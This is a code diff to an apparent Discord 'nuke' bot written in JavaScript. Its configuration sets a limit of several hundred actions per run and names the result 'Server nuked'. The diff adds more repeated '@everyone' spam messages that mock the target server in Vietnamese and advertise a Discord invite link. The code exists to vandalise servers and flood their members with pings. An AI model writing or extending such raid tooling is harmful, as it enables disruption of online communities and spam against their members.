@@ -25,7 +25,7 @@ const client = new Client({
 // ===== CONFIG =====
 const MAX_TOTAL = 510;
 const MAX_PER_RUN = 500;
-const CHANNEL_NAME = "Server nuked by Nhatdz";
+const CHANNEL_NAME = "Server nuked";
 // ==================
 
 const commands = [
@@ -96,6 +96,16 @@ client.on("interactionCreate", async interaction => {
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
       await sleep(200);
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
       await sleep(200);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
       await sleep(200);
